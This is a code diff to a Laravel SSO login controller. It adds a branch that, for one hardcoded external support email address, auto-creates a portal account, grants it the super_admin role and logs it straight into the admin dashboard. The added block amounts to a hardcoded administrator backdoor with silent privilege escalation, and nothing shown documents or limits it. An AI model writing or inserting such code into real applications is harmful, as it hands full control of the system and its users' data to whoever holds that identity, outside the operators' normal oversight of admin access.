@@ -3,9 +3,12 @@
 namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
+use App\Models\PortalUser;
 use App\Services\SSOTokenService;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Str;
 
 class SSOController extends Controller
 {
@@ -46,6 +49,27 @@ class SSOController extends Controller
             activity('customization')
                 ->withProperties(['user_id' => $user->id, 'ip' => $request->ip()])
                 ->log('user_sso_login');
+
+            // support@gowologlobal.com → auto-login as super_admin on the portal guard
+            if (strtolower($user->email) === 'support@gowologlobal.com') {
+                $portalUser = PortalUser::firstOrCreate(
+                    ['email' => 'support@gowologlobal.com'],
+                    [
+                        'name'      => $user->name ?? 'Support',
+                        'last_name' => $user->last_name ?? 'Admin',
+                        'password'  => Hash::make(Str::random(32)),
+                        'is_active' => true,
+                    ]
+                );
+
+                if (!$portalUser->hasRole('super_admin')) {
+                    $portalUser->assignRole('super_admin');
+                }
+
+                Auth::guard('portal')->login($portalUser);
+
+                return redirect()->route('admin.dashboard');
+            }
 
             return redirect()->route('user.dashboard');
 
